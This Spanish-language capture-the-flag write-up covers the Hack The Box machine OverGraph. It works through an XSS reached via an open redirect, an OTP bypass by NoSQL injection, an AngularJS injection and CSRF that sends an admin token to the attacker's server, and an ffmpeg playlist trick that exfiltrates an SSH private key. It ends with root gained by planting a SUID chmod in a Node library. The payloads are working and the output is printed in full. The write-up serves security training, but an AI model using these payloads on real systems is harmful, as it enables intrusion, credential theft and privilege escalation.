---
layout: post
title: OverGraph
date: 2023-02-20
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP (Escalada)]
---
___

<center><img src="/writeups/assets/img/OverGraph-htb/OverGraph.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Information Disclosure

* OpenRedirect a XSS

* Análisis de código Javascript

* Enumeración de API

* NoSQLi

* Manipulación de cabeceras locales

* CSTI

* XSS - AngularJS

* Enumeración GraphQL

* CSRF

* LocalHeader Hijacking

* SSRF a LFI (Exfiltración de datos)

* [!] Escalada por la vía normal no terminada

* Abuso de tarea CRON (Escalada no Intencionada)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.157 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 08:53 GMT
Nmap scan report for 10.10.11.157
Host is up (0.44s latency).
Not shown: 48224 closed tcp ports (reset), 17309 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.23 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.157 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 08:55 GMT
Nmap scan report for 10.10.11.157
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 34a9bf8fecb8d70ecf8de6a2ce674f30 (RSA)
|   256 45e10c6495179282a0b4357b68ac4ce1 (ECDSA)
|_  256 49e7c75e6a3799e526ea0eeb43c48859 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.69 seconds
```

Agrego ```graph.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está emplenado el servidor web

```null
whatweb http://10.10.11.157
http://10.10.11.157 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.157], RedirectLocation[http://graph.htb], Title[301 Moved Permanently], nginx[1.18.0]
http://graph.htb [200 OK] Bootstrap[5.1.3], Country[RESERVED][ZZ], Email[edward.yerburgh@gmail.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.157], JQuery[3.6.0], Script, Title[OneGraph], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/OverGraph-htb/1.png" alt="">


En el código fuente se filtra un parámetro

<img src="/writeups/assets/img/OverGraph-htb/2.png" alt="">

Es vulnerable a Open Redirect

```null
nc -nvlp 80
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.16.4] 46500
GET /rdt HTTP/1.1
Host: 10.10.16.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Referer: http://graph.htb/
Upgrade-Insecure-Requests: 1
```

En [Hacktricks](https://book.hacktricks.xyz/pentesting-web/open-redirect) hay una guía para abusar de estos. Lo puedo derivar a un XSS

<img src="/writeups/assets/img/OverGraph-htb/3.png" alt="">

También es posible realizar operatorias utilizando ```eval```

<img src="/writeups/assets/img/OverGraph-htb/4.png" alt="">

Y representando lo mismo pero en base64

<img src="/writeups/assets/img/OverGraph-htb/5.png" alt="">

En este [artículo](https://aayla-secura.github.io/xss-fetch-evasion) explican como es posible ejecutar código en Javascript abusando de esta evasión

Introduzco el siguiente payload en base64, al igual que antes

```null
echo -n "fetch('http://10.10.16.4/pwned.js').then(r=>r.text().then(eval))" | base64 -w 0 | xclip -sel clip
```

Recibo la petición a mi servicio HTTP

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.4 - - [18/Feb/2023 10:27:10] code 404, message File not found
10.10.16.4 - - [18/Feb/2023 10:27:10] "GET /pwned.js HTTP/1.1" 404 -
```

Agrego contenido al ```pwned.js```, pero al cargarlo no lo interpreta

```null
alert("XSS")
```

Otra forma de representar lo mismo sería así:

```null
javascript:document.body.innerHTML='<script src="http://10.10.16.4/pwned.js"></script>'
```

Y para evitar problemas, todo en URLencode, desde javascript: hacia delante.

<img src="/writeups/assets/img/OverGraph-htb/6.png" alt="">

Aplico fuzzing para descubir rutas y subdominios

```null
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://graph.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://graph.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================
000000277:   301        9 L      28 W       297 Ch      "assets"                              
000045226:   200        215 L    551 W      6384 Ch     "http://graph.htb/"                   
000095510:   200        268 L    602 W      16502 Ch    "server-status"                       

Total time: 4238.572
Processed Requests: 220546
Filtered Requests: 220543
Requests/sec.: 52.03308
```

```null
wfuzz -c -t 200 --hh=178 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.graph.htb" http://graph.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://graph.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000387:   200        14 L     33 W       607 Ch      "internal"                                                                                                                                     


Total time: 76.84874
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 64.91973   
```

Añado ```internal.graph.htb``` al ```/etc/hosts```. Este contiene un panel de inicio de sesión

<img src="/writeups/assets/img/OverGraph-htb/7.png" alt="">

Pongo un correo y una contraseña de ejemplo. Al interceptar la petición con BurpSuite, puedo ver un subdominio que referencia a una API. Lo incorporo al ```/etc/hosts```

<img src="/writeups/assets/img/OverGraph-htb/8.png" alt="">

En el código fuente se puede ver que se está utilizando ```Angular.js``` por detrás. Descargo el archivo js principal

```null
wget http://internal.graph.htb/main.0681ef4e6f13e51b.js
js-beautify main.0681ef4e6f13e51b.js | sponge main.0681ef4e6f13e51b.js
```

Suponiendo que se leaken rutas de la API, busco de forma recursiva por el subdominio de antes

```null
cat main.0681ef4e6f13e51b.js | grep -ri internal-api.graph.htb | grep -oP '".*?"' | tr -d '"' | grep http
http://internal-api.graph.htb/logout
http://internal-api.graph.htb/api/code
http://internal-api.graph.htb/api/verify
http://internal-api.graph.htb/api/register
http://internal-api.graph.htb/admin/video/upload
http://internal-api.graph.htb/graphql

```

Tramito peticiones a estas rutas para ver la respuesta

```null
curl -s -X POST http://internal-api.graph.htb/api/code
{"result":"Only @graph.htb are allowed"}
```

```null
curl -s -X POST http://internal-api.graph.htb/api/verify
{"result":"Invalid email"}
```

```null
curl -s -X POST http://internal-api.graph.htb/api/register
{"result":"All fields are required"}
```

```null
curl -s -X POST http://internal-api.graph.htb/admin/video/upload
{"result": "No admintoken header present" }
```

```null
curl -s -X POST http://internal-api.graph.htb/graphql
POST body missing. Did you forget use body-parser middleware?
```

Para ver la data que hay que tramitar por POST, inspecciono el código Javascript

```null
registerUser(n, r, i) {
    this.http.post("http://internal-api.graph.htb/api/register", {
        email: this.email,
        password: r,
        confirmPassword: i,
        username: n
    }).subscribe(o => {
        "Account Created Please Login!" === o.result && window.location.replace(""), this.result = o.result, setTimeout(() => {
            this.result = ""
        }, 5e3)
    })
}
```

Para poder registrame necesito esos campos. Al producir un error se leakean rutas y el usuario ```user```

```null
curl -s -X POST 'http://internal-api.graph.htb/api/register' -H "Content-Type: Application/json" -d '"email":"rubbx@graph.htb", "password":"rubbx", "confirmPassword":"rubbx", "username":"rubbx"'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token &quot; in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:158:10)<br> &nbsp; &nbsp;at parse (/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /home/user/onegraph/backend/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/home/user/onegraph/backend/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/home/user/onegraph/backend/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/home/user/onegraph/backend/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br> &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)</pre>
</body>
</html>
```

El correo que he introducido no es válido

```null
curl -s -X POST 'http://internal-api.graph.htb/api/register' -H "Content-Type: application/json" -d '{"email":"rubbx@graph.htb", "password":"rubbx", "confirmPassword":"rubbx", "username":"rubbx"}' | jq
{
  "result": "Invalid Email / Email not verified"
}
```

Como el error indica que no está verificado, filtro por la función que se encarga de ello

```null
verify(n) {
    this.http.post("http://internal-api.graph.htb/api/verify", {
        email: this.email,
        code: n
    }).subscribe(r => {
        "Email Verified" === r.result ? (this.emailVerified = "true", this.result = "Email Verified", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Invalid Code" === r.result ? (this.result = "Invalid Code", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Email already verified" === r.result ? (this.result = "Email already verified", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Invalid email" === r.result ? (this.result = "Invalid email", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Invalid otp 3 times, please request for new otp" === r.result && (this.result = "Invalid otp 3 times, please request for new otp", setTimeout(() => {
            this.result = "", window.location.replace("/register")
        }, 2e3))
    })
}
```

Tengo que encontrar la forma de conseguir el OTP

```null
sendCode(n) {
    n && ("graph.htb" === n.split("@")[1] ? (this.email = n, this.http.post("http://internal-api.graph.htb/api/code", {
        email: n
    }).subscribe(r => {
        "User Already Exists" === r.result ? (this.result = r.result, setTimeout(() => {
            this.result = ""
        }, 5e3)) : (this.sendOTP = "true", this.result = r.result, setTimeout(() => {
            this.result = ""
        }, 5e3))
    })) : (this.result = "Email must end with @graph.htb", setTimeout(() => {
        this.result = ""
    }, 5e3)))
```

Existe una forma de enumerar usuarios válidos en base a la respuesta, aunque de momento lo voy a dejar de lado. Envío el OTP al correo, que no existe, pero es funcional

```null
curl -s -X POST 'http://internal-api.graph.htb/api/code' -H "Content-Type: Application/json" -d '{"email":"rubbx@graph.htb"}' | jq
{
  "result": "4 digit code sent to your email"
}
```

Para poder verificarlo lo necesito, pero no es posible aplicar fuerza bruta, ya que al tercer intento fallido el OTP caduca

```null
verify(n) {
    this.http.post("http://internal-api.graph.htb/api/verify", {
        email: this.email,
        code: n
    }).subscribe(r => {
        "Email Verified" === r.result ? (this.emailVerified = "true", this.result = "Email Verified", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Invalid Code" === r.result ? (this.result = "Invalid Code", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Email already verified" === r.result ? (this.result = "Email already verified", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Invalid email" === r.result ? (this.result = "Invalid email", setTimeout(() => {
            this.result = ""
        }, 5e3)) : "Invalid otp 3 times, please request for new otp" === r.result && (this.result = "Invalid otp 3 times, please request for new otp", setTimeout(() => {
            this.result = "", window.location.replace("/register")
        }, 2e3))
    })
}
```

```null
curl -s -X POST 'http://internal-api.graph.htb/api/verify' -H "Content-Type: Application/json" -d '{"email":"rubbx@graph.htb", "code":"2222"}' | jq
{
  "result": "Invalid Code"
}
```

Pruebo a efectuar una NoSQLi, siguiendo la guía de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<img src="/writeups/assets/img/OverGraph-htb/10.png" alt="">

Ahora ya me puedo registrar sin problema

```null
curl -s -X POST 'http://internal-api.graph.htb/api/register' -H "Content-Type: application/json" -d '{"email":"rubbx@graph.htb", "password":"rubbx", "confirmPassword":"rubbx", "username":"rubbx"}' | jq
{
  "result": "Account Created Please Login!"
}
```

Más que loggearme a través de la API, voy directamente a la sección gráfica de la página web

<img src="/writeups/assets/img/OverGraph-htb/11.png" alt="">

Estoy arrastrando un JWT

<img src="/writeups/assets/img/OverGraph-htb/12.png" alt="">

Está compuesto por lo siguiente:

<img src="/writeups/assets/img/OverGraph-htb/13.png" alt="">

El campo ```id```, supongo que está en MD5, pero incompleto

```null
echo -n '63f0ad215b70fa041d0c591c' | wc -c
24
```

Una sección permite cambiar los ajustes de mi cuenta

<img src="/writeups/assets/img/OverGraph-htb/14.png" alt="">

Es vulnerable a SSTI

<img src="/writeups/assets/img/OverGraph-htb/24.png" alt="">

También lo es a un [XSS en Angular](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

```null
{% raw %}
{{constructor.constructor('alert(1)')()}}
{% endraw %}
```

<img src="/writeups/assets/img/OverGraph-htb/25.png" alt="">

La intercepto con BurpSuite, y puedo ver una query que se intruduce en una base de datos

<img src="/writeups/assets/img/OverGraph-htb/16.png" alt="">

Y también hay un chat

<img src="/writeups/assets/img/OverGraph-htb/15.png" alt="">

Como ya había encontrado un XSS, puedo intentar enviarle un enlace que se encargue de enviarme una petición a mi servicio http a modo de traza. mediante un archivo en javascript

```null
var peticion = new XMLHttpRequest();
peticion.open('GET', "http://10.10.16.2/testing", false);
peticion.send();
```

Le envío el Link, y recibo las peticiones

<img src="/writeups/assets/img/OverGraph-htb/17.png" alt="">

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.157 - - [20/Feb/2023 12:53:34] "GET /pwned.js HTTP/1.1" 200 -
10.10.11.157 - - [20/Feb/2023 12:53:34] code 404, message File not found
10.10.11.157 - - [20/Feb/2023 12:53:34] "GET /testing HTTP/1.1" 404 -
```

No puedo hacer un cookie hijacking directamente, ya que está activado el HTTP Only y no puedo extraer su JWT

<img src="/writeups/assets/img/OverGraph-htb/18.png" alt="">

Dentro del almacenamiento en caché, hay un valor que corresponde a un valor booleano para comprobar si mi usuario es administrador o no. Lo cambio a ```true```

<img src="/writeups/assets/img/OverGraph-htb/19.png" alt="">

Ahora tengo acceso a una sección de subida de archivos

<img src="/writeups/assets/img/OverGraph-htb/20.png" alt="">

Agrego la cabecera AdminToken, con cualquier valor, pero al intentar subir un archivo aparece un error diciendo que no es válido

<img src="/writeups/assets/img/OverGraph-htb/21.png" alt="">

<img src="/writeups/assets/img/OverGraph-htb/22.png" alt="">

Este valor se puede obtener desde el Javascript

<img src="/writeups/assets/img/OverGraph-htb/23.png" alt="">

Hago unas pruebas desde el XSS del perfil, y recibo lo que quiero

```null
{% raw %}
{{constructor.constructor('fetch("http://10.10.16.2/?username=" +window.localStorage.getItem("username"))')()}}
{% endraw %}
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.2 - - [20/Feb/2023 13:55:56] "GET /?username=rubbx HTTP/1.1" 200 -
10.10.16.2 - - [20/Feb/2023 13:55:56] "GET /?username=rubbx HTTP/1.1" 200 -
10.10.16.2 - - [20/Feb/2023 13:55:56] "GET /?username=rubbx HTTP/1.1" 200 -
10.10.16.2 - - [20/Feb/2023 13:55:56] "GET /?username=rubbx HTTP/1.1" 200 -
```

Enumero el ```Graphql```. Primeramente me interesa saber que campos existen

```null
curl -s -X POST 'http://internal-api.graph.htb/graphql' -d 'query={__schema{types{name,fields{name}}}}' | jq -r | grep name | sed 's/ *//' | sort -u
"name": "admin"
"name": "adminToken"
"name": "args"
"name": "Assignedto"
"name": "assignTask"
"name": "Boolean",
"name": "CacheControlScope",
"name": "createdAt"
"name": "defaultValue"
"name": "deprecationReason"
"name": "description"
"name": "__Directive",
"name": "__DirectiveLocation",
"name": "directives"
"name": "email"
"name": "__EnumValue",
"name": "enumValues"
"name": "__Field",
"name": "fields"
"name": "firstname"
"name": "from"
"name": "fromUserName"
"name": "id"
"name": "ID",
"name": "inputFields"
"name": "__InputValue",
"name": "Int",
"name": "interfaces"
"name": "isDeprecated"
"name": "kind"
"name": "lastname"
"name": "locations"
"name": "login"
"name": "Message",
"name": "Messages"
"name": "Mutation",
"name": "mutationType"
"name": "name"
"name": "ofType"
"name": "possibleTypes"
"name": "Query",
"name": "queryType"
"name": "__Schema",
"name": "sendMessage"
"name": "String",
"name": "subscriptionType"
"name": "task",
"name": "tasks"
"name": "taskstatus"
"name": "text"
"name": "to"
"name": "token"
"name": "toUserName"
"name": "type"
"name": "__Type",
"name": "__TypeKind",
"name": "types"
"name": "update"
"name": "Upload",
"name": "User",
"name": "username"
```

De todo necesito aquellos que forman el JWT

Como es mucha información, utilizo [Graphql-voyager](https://ivangoncharov.github.io/graphql-voyager/) para tener una representación gráfica

Para ello es necesario dumpear una serie de datos

```null
{% raw %}
curl -s -X POST 'http://internal-api.graph.htb/graphql' -d 'query=fragment FullType on __Type {%0A%20 kind%0A%20 name%0A%20 description%0A%20 fields {%0A%20%20%20 name%0A%20%20%20 description%0A%20%20%20 args {%0A%20%20%20%20%20 ...InputValue%0A%20%20%20 }%0A%20%20%20 type {%0A%20%20%20%20%20 ...TypeRef%0A%20%20%20 }%0A%20 }%0A%20 inputFields {%0A%20%20%20 ...InputValue%0A%20 }%0A%20 interfaces {%0A%20%20%20 ...TypeRef%0A%20 }%0A%20 enumValues {%0A%20%20%20 name%0A%20%20%20 description%0A%20 }%0A%20 possibleTypes {%0A%20%20%20 ...TypeRef%0A%20 }%0A}%0Afragment InputValue on __InputValue {%0A%20 name%0A%20 description%0A%20 type {%0A%20%20%20 ...TypeRef%0A%20 }%0A%20 defaultValue%0A}%0Afragment TypeRef on __Type {%0A%20 kind%0A%20 name%0A%20 ofType {%0A%20%20%20 kind%0A%20%20%20 name%0A%20%20%20 ofType {%0A%20%20%20%20%20 kind%0A%20%20%20%20%20 name%0A%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 }%0A%20%20%20%20%20%20%20%20%20%20%20 }%0A%20%20%20%20%20%20%20%20%20 }%0A%20%20%20%20%20%20%20 }%0A%20%20%20%20%20 }%0A%20%20%20 }%0A%20 }%0A}%0Aquery IntrospectionQuery {%0A%20 __schema {%0A%20%20%20 queryType {%0A%20%20%20%20%20 name%0A%20%20%20 }%0A%20%20%20 mutationType {%0A%20%20%20%20%20 name%0A%20%20%20 }%0A%20%20%20 types {%0A%20%20%20%20%20 ...FullType%0A%20%20%20 }%0A%20%20%20 directives {%0A%20%20%20%20%20 name%0A%20%20%20%20%20 description%0A%20%20%20%20%20 locations%0A%20%20%20%20%20 args {%0A%20%20%20%20%20%20%20 ...InputValue%0A%20%20%20%20%20 }%0A%20%20%20 }%0A%20 }%0A}%0A' | xclip -sel clip
{% endraw %}
```

<img src="/writeups/assets/img/OverGraph-htb/26.png" alt="">

La tarea tiene asignados varios campos

<img src="/writeups/assets/img/OverGraph-htb/27.png" alt="">

Desde la interfaz gráfica del Graphql, fuerzo a asignarselos a un usuario

<img src="/writeups/assets/img/OverGraph-htb/28.png" alt="">

Se filtra el ID del usuario ```Mark```. Puedo migrar a él modificando mis cabeceras

<img src="/writeups/assets/img/OverGraph-htb/29.png" alt="">

Pero esto no lleva a ningún lado. Vuelvo a interceptar la petición que se encarga de cambiar los datos del perfil. Se está tramitando por POST la data de los campos donde había encontrado el XSS de Angular.js

<img src="/writeups/assets/img/OverGraph-htb/30.png" alt="">

Puedo abusar del XSS que se encuentra tras el OpenRedirect para que el usuario que clicka en el enlace modifique su propio perfil, de manera que se introduzca la inyección del XSS de Angular.js para que tramite una petición por GET a un servicio HTTP de mi lado con el AdminToken

Modifico el pwned.js para poder abusar del CSRF

```null
{% raw %}
var req = new XMLHttpRequest();
req.open('POST', 'http://internal-api.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({
        operationName: "update",
        variables: {
                firstname: "mark",
                lastname: "{{constructor.constructor('fetch(\"http://10.10.16.2/token?adminToken=\" + localStorage.getItem(\"adminToken\"))')()}}",
                id: "63f39901bedfc207e843a7cd",
                newusername: "mark"
        },
        query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}"
});
req.send(body);
{% endraw %}
```

Al enviar el enlace recibo el AdminToken

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.157 - - [20/Feb/2023 16:28:33] "GET /pwned.js HTTP/1.1" 200 -
10.10.11.157 - - [20/Feb/2023 16:28:39] code 404, message File not found
10.10.11.157 - - [20/Feb/2023 16:28:39] "GET /token?adminToken=c0b9db4c8e4bbb24d59a3aaffa8c8b83 HTTP/1.1" 404 -
10.10.11.157 - - [20/Feb/2023 16:28:39] code 404, message File not found
10.10.11.157 - - [20/Feb/2023 16:28:39] "GET /token?adminToken=c0b9db4c8e4bbb24d59a3aaffa8c8b83 HTTP/1.1" 404 -
```

Intento subir de nuevo el archivo en PHP, pero ahora recibo otro error, la extensión no es válida

<img src="/writeups/assets/img/OverGraph-htb/31.png" alt="">

Intercepto la petición para ver en qué consiste

<img src="/writeups/assets/img/OverGraph-htb/32.png" alt="">

Le modifico la extensión a ```.php.mp4``` y burlo la restricción

<img src="/writeups/assets/img/OverGraph-htb/33.png" alt="">

No tengo ninguna ruta donde pueda acceder a él, por lo que los tiros no van por ahí. Como solo se están contemplando formatos de vídeo, es posible que por detrás esté involucrado ffmpeg, un software de Linux que actúa de intérprete. Existe una vulnerabilidad que abusa de un SSRF o LFI, reportada en [HackerOne](https://hackerone.com/reports/1062888). En el information Leakeage había encontrado un usuario válido a nivel de sistema, por lo que podría intentar obtener su clave privada de acceso por SSH

Para ello, hay que crear un archivo ```header.m3u8``` con el siguiente contenido:

```null
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://yourserver.com?
```

Es importante que no tenga el salto de línea del final

```null
00000000: 2345 5854 4d33 550a 2345 5854 2d58 2d4d  #EXTM3U.#EXT-X-M
00000010: 4544 4941 2d53 4551 5545 4e43 453a 300a  EDIA-SEQUENCE:0.
00000020: 2345 5854 494e 463a 2c0a 6874 7470 3a2f  #EXTINF:,.http:/
00000030: 2f31 302e 3130 2e31 362e 323f            /10.10.16.2?
```

En el archivo ```video.avi``` se indica el archivo al que se quiere acceder

```null
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.16.2/header.m3u8|subfile,,start,0,end,10000,,:/home/user/.ssh/id_rsa
#EXT-X-ENDLIST
```

Pero a la hora de exfiltrarlo no está completo

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.157 - - [20/Feb/2023 17:00:20] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [20/Feb/2023 17:00:21] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [20/Feb/2023 17:00:22] code 400, message Bad request syntax ('GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1')
10.10.11.157 - - [20/Feb/2023 17:00:22] "GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1" 400 -
```

Siguiendo este principio, es posible obtenerla al completo (Me puse a hacer un script en bash que lo automatizara, pero tenía errores a la hora de transformar el output)

```null
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd
1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA
AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Gano aceso por SSH

```null
ssh user@10.10.11.157 -i id_rsa

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Feb 20 18:01:51 2023 from 10.10.16.2
user@overgraph:~$
```

Puedo visualizar la primera flag

```null
user@overgraph:~$ cat user.txt 
eddb92777dd59868443a32c46df620ff
```

# Escalada (No intencionada)

En el directorio personal del usuario está almacenado el servicio web, que se estaba reiniciando cada cierto tiempo. Suponiendo que es root, puedo intentar inyectar comandos, modificando la configuración del ```mongoose```

```null
function Connection(base) {
  this.base = base;
  this.collections = {};
  this.models = {};
  this.config = {};
  this.replica = false;
  this.options = null;
  this.otherDbs = []; // FIXME: To be replaced with relatedDbs
  this.relatedDbs = {}; // Hashmap of other dbs that share underlying connection
  this.states = STATES;
  this._readyState = STATES.disconnected;
  this._closeCalled = false;
  this._hasOpened = false;
  this.plugins = [];
  if (typeof base === 'undefined' || !base.connections.length) {
    this.id = 0;
  } else {
    this.id = base.connections.length;
  }
  this._queue = [];
}
```

Le añado una función que se encargue de asignarle el privilegio SUID a la bash (Path: )

```null
const { exec } = require("child_process");

exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
}
```

Vuelvo a crear un usuario para resetear la base de datos

```null
curl -s -X POST http://internal-api.graph.htb/api/code -H "Content-Type: application/json" -d '{"email":"rubbx@graph.htb"}'; echo
{"result":"4 digit code sent to your email"}
```

```null
curl -s -X POST http://internal-api.graph.htb/api/verify -H "Content-Type: application/json" -d '{"email":"rubbx@graph.htb","code":{"$ne":"2222"}}'; echo
{"result":"Email Verified"}
```

```null
curl -s -X POST "http://internal-api.graph.htb/api/register" -H "Content-Type: application/json" -d '{"email":"rubbx@graph.htb", "password":"rubbx", "confirmPassword":"rubbx", "username":"rubbx"}'
{"result":"Account Created Please Login!"}
```

Pasados 10 minutos aproximadamente la bash se convierte en SUID

```null
user@overgraph:~/onegraph/backend/node_modules/mongoose/lib$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Me conecto como root y veo la segunda flag

```null
bash-5.0# cat /root/root.txt
69df8924024205e9d9957449d22ce471
```